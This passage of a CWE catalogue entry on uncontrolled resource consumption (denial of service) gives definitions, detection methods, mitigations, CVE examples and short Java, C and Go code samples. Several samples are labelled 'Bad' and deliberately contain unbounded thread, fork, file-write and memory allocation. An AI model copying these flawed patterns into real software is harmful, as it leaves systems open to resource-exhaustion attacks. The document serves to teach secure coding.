         <ns0:Description>The product does not properly control the allocation and maintenance of a limited resource, thereby enabling an actor to influence the amount of resources consumed, eventually leading to the exhaustion of available resources.</ns0:Description>
         <ns0:Extended_Description>
            <html:p>Limited resources include memory, file system storage, database connection pool entries, and CPU. If an attacker can trigger the allocation of these limited resources, but the number or size of the resources is not controlled, then the attacker could cause a denial of service that consumes all available resources. This would prevent valid users from accessing the product, and it could potentially have an impact on the surrounding environment. For example, a memory exhaustion attack against an application could slow down the application as well as its host operating system.</html:p>
            <html:p>There are at least three distinct scenarios which can commonly lead to resource exhaustion:</html:p>
               <html:ul>
                  <html:li>Lack of throttling for the number of allocated resources</html:li>
                  <html:li>Losing all references to a resource before reaching the shutdown stage</html:li>
                  <html:li>Not closing/returning a resource after processing</html:li>
               </html:ul>
            <html:p>Resource exhaustion problems are often result due to an incorrect implementation of the following situations:</html:p>
               <html:ul>
                  <html:li>Error conditions and other exceptional circumstances.</html:li>
                  <html:li>Confusion over which part of the program is responsible for releasing the resource.</html:li>
               </html:ul>
         </ns0:Extended_Description>
         <ns0:Related_Weaknesses>
            <ns0:Related_Weakness Nature="ChildOf" CWE_ID="664" View_ID="1000" Ordinal="Primary" />
         </ns0:Related_Weaknesses>
         <ns0:Applicable_Platforms>
            <ns0:Language Class="Not Language-Specific" Prevalence="Undetermined" />
         </ns0:Applicable_Platforms>
         <ns0:Alternate_Terms>
            <ns0:Alternate_Term>
               <ns0:Term>Resource Exhaustion</ns0:Term>
            </ns0:Alternate_Term>
         </ns0:Alternate_Terms>
         <ns0:Modes_Of_Introduction>
            <ns0:Introduction>
               <ns0:Phase>Operation</ns0:Phase>
            </ns0:Introduction>
            <ns0:Introduction>
               <ns0:Phase>Architecture and Design</ns0:Phase>
            </ns0:Introduction>
            <ns0:Introduction>
               <ns0:Phase>Implementation</ns0:Phase>
            </ns0:Introduction>
         </ns0:Modes_Of_Introduction>
         <ns0:Likelihood_Of_Exploit>High</ns0:Likelihood_Of_Exploit>
         <ns0:Common_Consequences>
            <ns0:Consequence>
               <ns0:Scope>Availability</ns0:Scope>
               <ns0:Impact>DoS: Crash, Exit, or Restart</ns0:Impact>
               <ns0:Impact>DoS: Resource Consumption (CPU)</ns0:Impact>
               <ns0:Impact>DoS: Resource Consumption (Memory)</ns0:Impact>
               <ns0:Impact>DoS: Resource Consumption (Other)</ns0:Impact>
               <ns0:Note>The most common result of resource exhaustion is denial of service. The product may slow down, crash due to unhandled errors, or lock out legitimate users.</ns0:Note>
            </ns0:Consequence>
            <ns0:Consequence>
               <ns0:Scope>Access Control</ns0:Scope>
               <ns0:Scope>Other</ns0:Scope>
               <ns0:Impact>Bypass Protection Mechanism</ns0:Impact>
               <ns0:Impact>Other</ns0:Impact>
               <ns0:Note>In some cases it may be possible to force the product to "fail open" in the event of resource exhaustion. The state of the product -- and possibly the security functionality - may then be compromised.</ns0:Note>
            </ns0:Consequence>
         </ns0:Common_Consequences>
         <ns0:Detection_Methods>
            <ns0:Detection_Method>
               <ns0:Method>Automated Static Analysis</ns0:Method>
               <ns0:Description>
                  <html:p>Automated static analysis typically has limited utility in recognizing resource exhaustion problems, except for program-independent system resources such as files, sockets, and processes. For system resources, automated static analysis may be able to detect circumstances in which resources are not released after they have expired. Automated analysis of configuration files may be able to detect settings that do not specify a maximum value.</html:p>
                  <html:p>Automated static analysis tools will not be appropriate for detecting exhaustion of custom resources, such as an intended security policy in which a bulletin board user is only allowed to make a limited number of posts per day.</html:p>
               </ns0:Description>
               <ns0:Effectiveness>Limited</ns0:Effectiveness>
            </ns0:Detection_Method>
            <ns0:Detection_Method>
               <ns0:Method>Automated Dynamic Analysis</ns0:Method>
               <ns0:Description>Certain automated dynamic analysis techniques may be effective in spotting resource exhaustion problems, especially with resources such as processes, memory, and connections. The technique may involve generating a large number of requests to the product within a short time frame.</ns0:Description>
               <ns0:Effectiveness>Moderate</ns0:Effectiveness>
            </ns0:Detection_Method>
            <ns0:Detection_Method>
               <ns0:Method>Fuzzing</ns0:Method>
               <ns0:Description>While fuzzing is typically geared toward finding low-level implementation bugs, it can inadvertently find resource exhaustion problems. This can occur when the fuzzer generates a large number of test cases but does not restart the targeted product in between test cases. If an individual test case produces a crash, but it does not do so reliably, then an inability to handle resource exhaustion may be the cause.</ns0:Description>
               <ns0:Effectiveness>Opportunistic</ns0:Effectiveness>
            </ns0:Detection_Method>
         </ns0:Detection_Methods>
         <ns0:Potential_Mitigations>
            <ns0:Mitigation>
               <ns0:Phase>Architecture and Design</ns0:Phase>
               <ns0:Description>Design throttling mechanisms into the system architecture. The best protection is to limit the amount of resources that an unauthorized user can cause to be expended. A strong authentication and access control model will help prevent such attacks from occurring in the first place. The login application should be protected against DoS attacks as much as possible. Limiting the database access, perhaps by caching result sets, can help minimize the resources expended. To further limit the potential for a DoS attack, consider tracking the rate of requests received from users and blocking requests that exceed a defined rate threshold.</ns0:Description>
            </ns0:Mitigation>
            <ns0:Mitigation>
               <ns0:Phase>Architecture and Design</ns0:Phase>
               <ns0:Description>
                  <html:p>Mitigation of resource exhaustion attacks requires that the target system either:</html:p>
                     <html:ul>
                        <html:li>recognizes the attack and denies that user further access for a given amount of time, or</html:li>
                        <html:li>uniformly throttles all requests in order to make it more difficult to consume resources more quickly than they can again be freed.</html:li>
                     </html:ul>
                  <html:p>The first of these solutions is an issue in itself though, since it may allow attackers to prevent the use of the system by a particular valid user. If the attacker impersonates the valid user, they may be able to prevent the user from accessing the server in question.</html:p>
                  <html:p>The second solution is simply difficult to effectively institute -- and even when properly done, it does not provide a full solution. It simply makes the attack require more resources on the part of the attacker.</html:p>
               </ns0:Description>
            </ns0:Mitigation>
            <ns0:Mitigation>
               <ns0:Phase>Architecture and Design</ns0:Phase>
               <ns0:Description>Ensure that protocols have specific limits of scale placed on them.</ns0:Description>
            </ns0:Mitigation>
            <ns0:Mitigation>
               <ns0:Phase>Implementation</ns0:Phase>
               <ns0:Description>Ensure that all failures in resource allocation place the system into a safe posture.</ns0:Description>
            </ns0:Mitigation>
         </ns0:Potential_Mitigations>
         <ns0:Demonstrative_Examples>
            <ns0:Demonstrative_Example>
               <ns0:Intro_Text>The following example demonstrates the weakness.</ns0:Intro_Text>
               <ns0:Example_Code Nature="Bad" Language="Java">
                  <html:div>class Worker implements Executor {<html:div style="margin-left:1em;">
                        <html:div>...<html:br />public void execute(Runnable r) {<html:div style="margin-left:1em;">
                              <html:div>
                                 <html:br />try {<html:div style="margin-left:1em;">...</html:div>}<html:br />catch (InterruptedException ie) {<html:div style="margin-left:1em;">
                                    <html:div>
                                       <html:br />
                                       <html:i>// postpone response</html:i>
                                       <html:br />Thread.currentThread().interrupt();</html:div>
                                 </html:div>}</html:div>
                           </html:div>}<html:br />
                           <html:br />public Worker(Channel ch, int nworkers) {<html:div style="margin-left:1em;">...</html:div>}<html:br />
                           <html:br />protected void activate() {<html:div style="margin-left:1em;">
                              <html:div>
                                 <html:br />Runnable loop = new Runnable() {<html:div style="margin-left:1em;">
                                    <html:div>
                                       <html:br />public void run() {<html:div style="margin-left:1em;">
                                          <html:div>
                                             <html:br />try {<html:div style="margin-left:1em;">for (;;) {<html:div style="margin-left:1em;">Runnable r = ...;<html:br />r.run();</html:div>}</html:div>}<html:br />catch (InterruptedException ie) {<html:div style="margin-left:1em;">...</html:div>}</html:div>
                                       </html:div>}</html:div>
                                 </html:div>};<html:br />new Thread(loop).start();</html:div>
                           </html:div>}</html:div>
                     </html:div>}</html:div>
               </ns0:Example_Code>
               <ns0:Body_Text>There are no limits to runnables. Potentially an attacker could cause resource problems very quickly.</ns0:Body_Text>
            </ns0:Demonstrative_Example>
            <ns0:Demonstrative_Example Demonstrative_Example_ID="DX-25">
               <ns0:Intro_Text>This code allocates a socket and forks each time it receives a new connection.</ns0:Intro_Text>
               <ns0:Example_Code Nature="Bad" Language="C">
                  <html:div>sock=socket(AF_INET, SOCK_STREAM, 0);<html:br />while (1) {<html:div style="margin-left:1em;">newsock=accept(sock, ...);<html:br />printf("A connection has been accepted\n");<html:br />pid = fork();</html:div>}</html:div>
               </ns0:Example_Code>
               <ns0:Body_Text>The program does not track how many connections have been made, and it does not limit the number of connections. Because forking is a relatively expensive operation, an attacker would be able to cause the system to run out of CPU, processes, or memory by making a large number of connections. Alternatively, an attacker could consume all available connections, preventing others from accessing the system remotely.</ns0:Body_Text>
            </ns0:Demonstrative_Example>
            <ns0:Demonstrative_Example Demonstrative_Example_ID="DX-50">
               <ns0:Intro_Text>In the following example a server socket connection is used to accept a request to store data on the local file system using a specified filename. The method openSocketConnection establishes a server socket to accept requests from a client. When a client establishes a connection to this service the getNextMessage method is first used to retrieve from the socket the name of the file to store the data, the openFileToWrite method will validate the filename and open a file to write to on the local file system. The getNextMessage is then used within a while loop to continuously read data from the socket and output the data to the file until there is no longer any data from the socket.</ns0:Intro_Text>
               <ns0:Example_Code Nature="Bad" Language="C">
                  <html:div>int writeDataFromSocketToFile(char *host, int port)<html:br />{<html:div style="margin-left:1em;">
                        <html:div>
                           <html:br />char filename[FILENAME_SIZE];<html:br />char buffer[BUFFER_SIZE];<html:br />int socket = openSocketConnection(host, port);<html:br />
                           <html:br />if (socket &lt; 0) {<html:div style="margin-left:1em;">printf("Unable to open socket connection");<html:br />return(FAIL);</html:div>}<html:br />if (getNextMessage(socket, filename, FILENAME_SIZE) &gt; 0) {<html:div style="margin-left:1em;">
                              <html:div>if (openFileToWrite(filename) &gt; 0) {<html:div style="margin-left:1em;">
                                    <html:div>while (getNextMessage(socket, buffer, BUFFER_SIZE) &gt; 0){<html:div style="margin-left:1em;">if (!(writeToFile(buffer) &gt; 0))<html:div style="margin-left:1em;">break;</html:div>
                                       </html:div>}</html:div>
                                 </html:div>}<html:br />closeFile();</html:div>
                           </html:div>}<html:br />closeSocket(socket);</html:div>
                     </html:div>}</html:div>
               </ns0:Example_Code>
               <ns0:Body_Text>This example creates a situation where data can be dumped to a file on the local file system without any limits on the size of the file. This could potentially exhaust file or disk resources and/or limit other clients' ability to access the service.</ns0:Body_Text>
            </ns0:Demonstrative_Example>
            <ns0:Demonstrative_Example Demonstrative_Example_ID="DX-51">
               <ns0:Intro_Text>In the following example, the processMessage method receives a two dimensional character array containing the message to be processed. The two-dimensional character array contains the length of the message in the first character array and the message body in the second character array. The getMessageLength method retrieves the integer value of the length from the first character array. After validating that the message length is greater than zero, the body character array pointer points to the start of the second character array of the two-dimensional character array and memory is allocated for the new body character array.</ns0:Intro_Text>
               <ns0:Example_Code Nature="Bad" Language="C">
                  <html:div>
                     <html:br />
                     <html:i>/* process message accepts a two-dimensional character array of the form [length][body] containing the message to be processed */</html:i>
                     <html:br />int processMessage(char **message)<html:br />{<html:div style="margin-left:1em;">
                        <html:div>char *body;<html:br />
                           <html:br />int length = getMessageLength(message[0]);<html:br />
                           <html:br />if (length &gt; 0) {<html:div style="margin-left:1em;">body = &amp;message[1][0];<html:br />processMessageBody(body);<html:br />return(SUCCESS);</html:div>}<html:br />else {<html:div style="margin-left:1em;">printf("Unable to process message; invalid message length");<html:br />return(FAIL);</html:div>}</html:div>
                     </html:div>}</html:div>
               </ns0:Example_Code>
               <ns0:Body_Text>This example creates a situation where the length of the body character array can be very large and will consume excessive memory, exhausting system resources. This can be avoided by restricting the length of the second character array with a maximum length check</ns0:Body_Text>
               <ns0:Body_Text>Also, consider changing the type from 'int' to 'unsigned int', so that you are always guaranteed that the number is positive. This might not be possible if the protocol specifically requires allowing negative values, or if you cannot control the return value from getMessageLength(), but it could simplify the check to ensure the input is positive, and eliminate other errors such as signed-to-unsigned conversion errors (CWE-195) that may occur elsewhere in the code.</ns0:Body_Text>
               <ns0:Example_Code Nature="Good" Language="C">
                  <html:div>unsigned int length = getMessageLength(message[0]);<html:br />if ((length &gt; 0) &amp;&amp; (length &lt; MAX_LENGTH)) {...}</html:div>
               </ns0:Example_Code>
            </ns0:Demonstrative_Example>
            <ns0:Demonstrative_Example Demonstrative_Example_ID="DX-52">
               <ns0:Intro_Text>In the following example, a server object creates a server socket and accepts client connections to the socket. For every client connection to the socket a separate thread object is generated using the ClientSocketThread class that handles request made by the client through the socket.</ns0:Intro_Text>
               <ns0:Example_Code Nature="Bad" Language="Java">
                  <html:div>public void acceptConnections() {<html:br />
                     <html:div style="margin-left:1em;">
                        <html:div>try {<html:div style="margin-left:1em;">ServerSocket serverSocket = new ServerSocket(SERVER_PORT);<html:br />int counter = 0;<html:br />boolean hasConnections = true;<html:br />while (hasConnections) {<html:div style="margin-left:1em;">Socket client = serverSocket.accept();<html:br />Thread t = new Thread(new ClientSocketThread(client));<html:br />t.setName(client.getInetAddress().getHostName() + ":" + counter++);<html:br />t.start();</html:div>}<html:br />serverSocket.close();</html:div>
                           <html:br />
                           <html:br />} catch (IOException ex) {...}</html:div>
                     </html:div>}</html:div>
               </ns0:Example_Code>
               <ns0:Body_Text>In this example there is no limit to the number of client connections and client threads that are created. Allowing an unlimited number of client connections and threads could potentially overwhelm the system and system resources.</ns0:Body_Text>
               <ns0:Body_Text>The server should limit the number of client connections and the client threads that are created. This can be easily done by creating a thread pool object that limits the number of threads that are generated.</ns0:Body_Text>
               <ns0:Example_Code Nature="Good" Language="Java">
                  <html:div>public static final int SERVER_PORT = 4444;<html:br />public static final int MAX_CONNECTIONS = 10;<html:br />...<html:br />
                     <html:br />public void acceptConnections() {<html:br />
                     <html:div style="margin-left:1em;">
                        <html:div>try {<html:div style="margin-left:1em;">ServerSocket serverSocket = new ServerSocket(SERVER_PORT);<html:br />int counter = 0;<html:br />boolean hasConnections = true;<html:br />while (hasConnections) {<html:div style="margin-left:1em;">hasConnections = checkForMoreConnections();<html:br />Socket client = serverSocket.accept();<html:br />Thread t = new Thread(new ClientSocketThread(client));<html:br />t.setName(client.getInetAddress().getHostName() + ":" + counter++);<html:br />ExecutorService pool = Executors.newFixedThreadPool(MAX_CONNECTIONS);<html:br />pool.execute(t);</html:div>}<html:br />serverSocket.close();</html:div>
                           <html:br />
                           <html:br />} catch (IOException ex) {...}</html:div>
                     </html:div>}</html:div>
               </ns0:Example_Code>
            </ns0:Demonstrative_Example>
            <ns0:Demonstrative_Example>
               <ns0:Intro_Text>In the following example, the serve function receives an http request and an http response writer. It reads the entire request body.</ns0:Intro_Text>
               <ns0:Example_Code Nature="Bad" Language="Go">
                  <html:div>func serve(w http.ResponseWriter, r *http.Request) {
                     <html:div style="margin-left:1em;">
                        var body []byte<html:br />
                        if r.Body != nil {<html:br />
                        <html:div style="margin-left:1em;">
                           if data, err := io.ReadAll(r.Body); err == nil {<html:br />
                           <html:div style="margin-left:1em;">
                              body = data<html:br />
                           </html:div>
                           }</html:div>
                        }</html:div>
                  }</html:div>
               </ns0:Example_Code>
               <ns0:Body_Text>Because ReadAll is defined to read from src until EOF, it does not treat an EOF from Read as an error to be reported. This example creates a situation where the length of the body supplied can be very large and will consume excessive memory, exhausting system resources. This can be avoided by ensuring the body does not exceed a predetermined length of bytes.</ns0:Body_Text>
               <ns0:Body_Text>MaxBytesReader prevents clients from accidentally or maliciously sending a large request and wasting server resources. If possible, the code could be changed to tell ResponseWriter to close the connection after the limit has been reached.</ns0:Body_Text>
               <ns0:Example_Code Nature="Good" Language="Go">
                  <html:div>func serve(w http.ResponseWriter, r *http.Request) {
                     <html:div style="margin-left:1em;">
                        var body []byte<html:br />
                        const MaxRespBodyLength = 1e6<html:br />
                        if r.Body != nil {<html:br />
                        <html:div style="margin-left:1em;">
                           r.Body = http.MaxBytesReader(w, r.Body, MaxRespBodyLength)<html:br />
                           if data, err := io.ReadAll(r.Body); err == nil {<html:br />
                           <html:div style="margin-left:1em;">
                              body = data<html:br />
                           </html:div>
                           }</html:div>
                        }</html:div>
                  }</html:div>
               </ns0:Example_Code>
            </ns0:Demonstrative_Example>
         </ns0:Demonstrative_Examples>
         <ns0:Observed_Examples>
            <ns0:Observed_Example>
               <ns0:Reference>CVE-2022-21668</ns0:Reference>
               <ns0:Description>Chain: Python library does not limit the resources used to process images that specify a very large number of bands (CWE-1284), leading to excessive memory consumption (CWE-789) or an integer overflow (CWE-190).</ns0:Description>
               <ns0:Link>https://www.cve.org/CVERecord?id=CVE-2022-21668</ns0:Link>
            </ns0:Observed_Example>
            <ns0:Observed_Example>
               <ns0:Reference>CVE-2020-7218</ns0:Reference>
               <ns0:Description>Go-based workload orchestrator does not limit resource usage with unauthenticated connections, allowing a DoS by flooding the service</ns0:Description>
               <ns0:Link>https://www.cve.org/CVERecord?id=CVE-2020-7218</ns0:Link>
            </ns0:Observed_Example>
            <ns0:Observed_Example>
               <ns0:Reference>CVE-2020-3566</ns0:Reference>
               <ns0:Description>Resource exhaustion in distributed OS because of "insufficient" IGMP queue management, as exploited in the wild per CISA KEV.</ns0:Description>
               <ns0:Link>https://www.cve.org/CVERecord?id=CVE-2020-3566</ns0:Link>
            </ns0:Observed_Example>
            <ns0:Observed_Example>
               <ns0:Reference>CVE-2009-2874</ns0:Reference>
               <ns0:Description>Product allows attackers to cause a crash via a large number of connections.</ns0:Description>
               <ns0:Link>https://www.cve.org/CVERecord?id=CVE-2009-2874</ns0:Link>
            </ns0:Observed_Example>
            <ns0:Observed_Example>
               <ns0:Reference>CVE-2009-1928</ns0:Reference>
               <ns0:Description>Malformed request triggers uncontrolled recursion, leading to stack exhaustion.</ns0:Description>
               <ns0:Link>https://www.cve.org/CVERecord?id=CVE-2009-1928</ns0:Link>
            </ns0:Observed_Example>
            <ns0:Observed_Example>
               <ns0:Reference>CVE-2009-2858</ns0:Reference>
               <ns0:Description>Chain: memory leak (CWE-404) leads to resource exhaustion.</ns0:Description>
               <ns0:Link>https://www.cve.org/CVERecord?id=CVE-2009-2858</ns0:Link>
            </ns0:Observed_Example>
            <ns0:Observed_Example>
               <ns0:Reference>CVE-2009-2726</ns0:Reference>
               <ns0:Description>Driver does not use a maximum width when invoking sscanf style functions, causing stack consumption.</ns0:Description>
               <ns0:Link>https://www.cve.org/CVERecord?id=CVE-2009-2726</ns0:Link>
            </ns0:Observed_Example>
            <ns0:Observed_Example>
               <ns0:Reference>CVE-2009-2540</ns0:Reference>
               <ns0:Description>Large integer value for a length property in an object causes a large amount of memory allocation.</ns0:Description>
               <ns0:Link>https://www.cve.org/CVERecord?id=CVE-2009-2540</ns0:Link>
            </ns0:Observed_Example>
            <ns0:Observed_Example>
               <ns0:Reference>CVE-2009-2299</ns0:Reference>
               <ns0:Description>Web application firewall consumes excessive memory when an HTTP request contains a large Content-Length value but no POST data.</ns0:Description>
               <ns0:Link>https://www.cve.org/CVERecord?id=CVE-2009-2299</ns0:Link>
            </ns0:Observed_Example>
            <ns0:Observed_Example>
               <ns0:Reference>CVE-2009-2054</ns0:Reference>
               <ns0:Description>Product allows exhaustion of file descriptors when processing a large number of TCP packets.</ns0:Description>
               <ns0:Link>https://www.cve.org/CVERecord?id=CVE-2009-2054</ns0:Link>
            </ns0:Observed_Example>
            <ns0:Observed_Example>
               <ns0:Reference>CVE-2008-5180</ns0:Reference>
               <ns0:Description>Communication product allows memory consumption with a large number of SIP requests, which cause many sessions to be created.</ns0:Description>
               <ns0:Link>https://www.cve.org/CVERecord?id=CVE-2008-5180</ns0:Link>
            </ns0:Observed_Example>
            <ns0:Observed_Example>
               <ns0:Reference>CVE-2008-2121</ns0:Reference>
               <ns0:Description>TCP implementation allows attackers to consume CPU and prevent new connections using a TCP SYN flood attack.</ns0:Description>
               <ns0:Link>https://www.cve.org/CVERecord?id=CVE-2008-2121</ns0:Link>
            </ns0:Observed_Example>
            <ns0:Observed_Example>
               <ns0:Reference>CVE-2008-2122</ns0:Reference>
               <ns0:Description>Port scan triggers CPU consumption with processes that attempt to read data from closed sockets.</ns0:Description>
               <ns0:Link>https://www.cve.org/CVERecord?id=CVE-2008-2122</ns0:Link>
            </ns0:Observed_Example>
            <ns0:Observed_Example>
               <ns0:Reference>CVE-2008-1700</ns0:Reference>
               <ns0:Description>Product allows attackers to cause a denial of service via a large number of directives, each of which opens a separate window.</ns0:Description>
               <ns0:Link>https://www.cve.org/CVERecord?id=CVE-2008-1700</ns0:Link>
            </ns0:Observed_Example>
            <ns0:Observed_Example>
               <ns0:Reference>CVE-2007-4103</ns0:Reference>
               <ns0:Description>Product allows resource exhaustion via a large number of calls that do not complete a 3-way handshake.</ns0:Description>
               <ns0:Link>https://www.cve.org/CVERecord?id=CVE-2007-4103</ns0:Link>
            </ns0:Observed_Example>
            <ns0:Observed_Example>
               <ns0:Reference>CVE-2006-1173</ns0:Reference>
               <ns0:Description>Mail server does not properly handle deeply nested multipart MIME messages, leading to stack exhaustion.</ns0:Description>
               <ns0:Link>https://www.cve.org/CVERecord?id=CVE-2006-1173</ns0:Link>
            </ns0:Observed_Example>
            <ns0:Observed_Example>
               <ns0:Reference>CVE-2007-0897</ns0:Reference>
               <ns0:Description>Chain: anti-virus product encounters a malformed file but returns from a function without closing a file descriptor (CWE-775) leading to file descriptor consumption (CWE-400) and failed scans.</ns0:Description>
               <ns0:Link>https://www.cve.org/CVERecord?id=CVE-2007-0897</ns0:Link>
            </ns0:Observed_Example>
         </ns0:Observed_Examples>
         <ns0:Taxonomy_Mappings>
            <ns0:Taxonomy_Mapping Taxonomy_Name="CLASP">
               <ns0:Entry_Name>Resource exhaustion (file descriptor, disk space, sockets, ...)</ns0:Entry_Name>
            </ns0:Taxonomy_Mapping>
            <ns0:Taxonomy_Mapping Taxonomy_Name="OWASP Top Ten 2004">
               <ns0:Entry_ID>A9</ns0:Entry_ID>
               <ns0:Entry_Name>Denial of Service</ns0:Entry_Name>
               <ns0:Mapping_Fit>CWE More Specific</ns0:Mapping_Fit>
            </ns0:Taxonomy_Mapping>
            <ns0:Taxonomy_Mapping Taxonomy_Name="WASC">
               <ns0:Entry_ID>10</ns0:Entry_ID>
               <ns0:Entry_Name>Denial of Service</ns0:Entry_Name>
            </ns0:Taxonomy_Mapping>
            <ns0:Taxonomy_Mapping Taxonomy_Name="WASC">
               <ns0:Entry_ID>41</ns0:Entry_ID>
               <ns0:Entry_Name>XML Attribute Blowup</ns0:Entry_Name>
            </ns0:Taxonomy_Mapping>
            <ns0:Taxonomy_Mapping Taxonomy_Name="The CERT Oracle Secure Coding Standard for Java (2011)">
               <ns0:Entry_ID>SER12-J</ns0:Entry_ID>
               <ns0:Entry_Name>Avoid memory and resource leaks during serialization</ns0:Entry_Name>
            </ns0:Taxonomy_Mapping>
            <ns0:Taxonomy_Mapping Taxonomy_Name="The CERT Oracle Secure Coding Standard for Java (2011)">
               <ns0:Entry_ID>MSC05-J</ns0:Entry_ID>
               <ns0:Entry_Name>Do not exhaust heap space</ns0:Entry_Name>
            </ns0:Taxonomy_Mapping>
            <ns0:Taxonomy_Mapping Taxonomy_Name="Software Fault Patterns">
               <ns0:Entry_ID>SFP13</ns0:Entry_ID>
               <ns0:Entry_Name>Unrestricted Consumption</ns0:Entry_Name>
            </ns0:Taxonomy_Mapping>
	    <ns0:Taxonomy_Mapping Taxonomy_Name="ISA/IEC 62443">
	      <ns0:Entry_ID>Part 3-3</ns0:Entry_ID>
              <ns0:Entry_Name>Req SR 7.1</ns0:Entry_Name>
	    </ns0:Taxonomy_Mapping>
	    <ns0:Taxonomy_Mapping Taxonomy_Name="ISA/IEC 62443">
	      <ns0:Entry_ID>Part 3-3</ns0:Entry_ID>
              <ns0:Entry_Name>Req SR 7.2</ns0:Entry_Name>
	    </ns0:Taxonomy_Mapping>
	    <ns0:Taxonomy_Mapping Taxonomy_Name="ISA/IEC 62443">
	      <ns0:Entry_ID>Part 4-1</ns0:Entry_ID>
	      <ns0:Entry_Name>Req SI-1</ns0:Entry_Name>
	    </ns0:Taxonomy_Mapping>
	    <ns0:Taxonomy_Mapping Taxonomy_Name="ISA/IEC 62443">
	      <ns0:Entry_ID>Part 4-1</ns0:Entry_ID>
	      <ns0:Entry_Name>Req SVV-3</ns0:Entry_Name>
	    </ns0:Taxonomy_Mapping>
	    <ns0:Taxonomy_Mapping Taxonomy_Name="ISA/IEC 62443">
	      <ns0:Entry_ID>Part 4-2</ns0:Entry_ID>
              <ns0:Entry_Name>Req CR 7.1</ns0:Entry_Name>
	    </ns0:Taxonomy_Mapping>
	    <ns0:Taxonomy_Mapping Taxonomy_Name="ISA/IEC 62443">
	      <ns0:Entry_ID>Part 4-2</ns0:Entry_ID>
              <ns0:Entry_Name>Req CR 7.2</ns0:Entry_Name>
	    </ns0:Taxonomy_Mapping>
         </ns0:Taxonomy_Mappings>
         <ns0:Related_Attack_Patterns>
            <ns0:Related_Attack_Pattern CAPEC_ID="147" />
            <ns0:Related_Attack_Pattern CAPEC_ID="227" />
            <ns0:Related_Attack_Pattern CAPEC_ID="492" />
         </ns0:Related_Attack_Patterns>
         <ns0:References>
            <ns0:Reference External_Reference_ID="REF-18" />
            <ns0:Reference External_Reference_ID="REF-386" />
            <ns0:Reference External_Reference_ID="REF-387" />
            <ns0:Reference External_Reference_ID="REF-388" />
            <ns0:Reference External_Reference_ID="REF-7" Section="Chapter 17, &quot;Protecting Against Denial of Service Attacks&quot; Page 517" />
         </ns0:References>
         <ns0:Mapping_Notes>
            <ns0:Usage>Discouraged</ns0:Usage>
            <ns0:Rationale>CWE-400 is intended for incorrect behaviors in which the product is expected to track and restrict how many resources it consumes, but CWE-400 is often misused because it is conflated with the "technical impact" of vulnerabilities in which resource consumption occurs. It is sometimes used for low-information vulnerability reports. It is a level-1 Class (i.e., a child of a Pillar).</ns0:Rationale>
            <ns0:Comments>Closely analyze the specific mistake that is causing resource consumption, and perform a CWE mapping for that mistake. Consider children/descendants such as CWE-770: Allocation of Resources Without Limits or Throttling, CWE-771: Missing Reference to Active Allocated Resource, CWE-410: Insufficient Resource Pool, CWE-772: Missing Release of Resource after Effective Lifetime, CWE-834: Excessive Iteration, CWE-405: Asymmetric Resource Consumption (Amplification), and others.</ns0:Comments>
            <ns0:Reasons>
               <ns0:Reason Type="Frequent Misuse" />
            </ns0:Reasons>
         </ns0:Mapping_Notes>
         <ns0:Notes>
	    <ns0:Note Type="Maintenance">"Resource consumption" could be interpreted as a consequence instead of an insecure behavior, so this entry is being considered for modification.  It appears to be referenced too frequently when more precise mappings are available.  Some of its children, such as CWE-771, might be better considered as a chain.</ns0:Note>
            <ns0:Note Type="Theoretical">Vulnerability theory is largely about how behaviors and resources interact. "Resource exhaustion" can be regarded as either a consequence or an attack, depending on the perspective. This entry is an attempt to reflect the underlying weaknesses that enable these attacks (or consequences) to take place.</ns0:Note>
            <ns0:Note Type="Other">
               <html:p>Database queries that take a long time to process are good DoS targets. An attacker would have to write a few lines of Perl code to generate enough traffic to exceed the site's ability to keep up. This would effectively prevent authorized users from using the site at all. Resources can be exploited simply by ensuring that the target machine must do much more work and consume more resources in order to service a request than the attacker must do to initiate a request.</html:p>
               <html:p>A prime example of this can be found in old switches that were vulnerable to "macof" attacks (so named for a tool developed by Dugsong). These attacks flooded a switch with random IP and MAC address combinations, therefore exhausting the switch's cache, which held the information of which port corresponded to which MAC addresses. Once this cache was exhausted, the switch would fail in an insecure way and would begin to act simply as a hub, broadcasting all traffic on all ports and allowing for basic sniffing attacks.</html:p>
            </ns0:Note>
			<ns0:Note Type="Maintenance">The Taxonomy_Mappings to ISA/IEC 62443 were added in CWE 4.10, but they are still under review and might change in future CWE versions. These draft mappings were performed by members of the "Mapping CWE to 62443" subgroup of the CWE-CAPEC ICS/OT Special Interest Group (SIG), and their work is incomplete as of CWE 4.10. The mappings are included to facilitate discussion and review by the broader ICS/OT community, and they are likely to change in future CWE versions.</ns0:Note>
         </ns0:Notes>
         <ns0:Content_History>
            <ns0:Submission>
               <ns0:Submission_Name>CLASP</ns0:Submission_Name>
               <ns0:Submission_Date>2006-07-19</ns0:Submission_Date>
               <ns0:Submission_Version>Draft 3</ns0:Submission_Version>
               <ns0:Submission_ReleaseDate>2006-07-19</ns0:Submission_ReleaseDate>
            </ns0:Submission>
            <ns0:Modification>
               <ns0:Modification_Name>Eric Dalci</ns0:Modification_Name>
               <ns0:Modification_Organization>Cigital</ns0:Modification_Organization>
               <ns0:Modification_Date>2008-07-01</ns0:Modification_Date>
               <ns0:Modification_Comment>updated Time_of_Introduction</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Organization>Veracode</ns0:Modification_Organization>
               <ns0:Modification_Date>2008-08-15</ns0:Modification_Date>
               <ns0:Modification_Comment>Suggested OWASP Top Ten 2004 mapping</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
               <ns0:Modification_Date>2008-09-08</ns0:Modification_Date>
               <ns0:Modification_Comment>updated Common_Consequences, Relationships, Other_Notes, Taxonomy_Mappings</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
               <ns0:Modification_Date>2008-10-14</ns0:Modification_Date>
               <ns0:Modification_Comment>updated Description, Name, Relationships</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
               <ns0:Modification_Date>2009-01-12</ns0:Modification_Date>
               <ns0:Modification_Comment>updated Description</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
               <ns0:Modification_Date>2009-05-27</ns0:Modification_Date>
               <ns0:Modification_Comment>updated Name, Relationships</ns0:Modification_Comment>
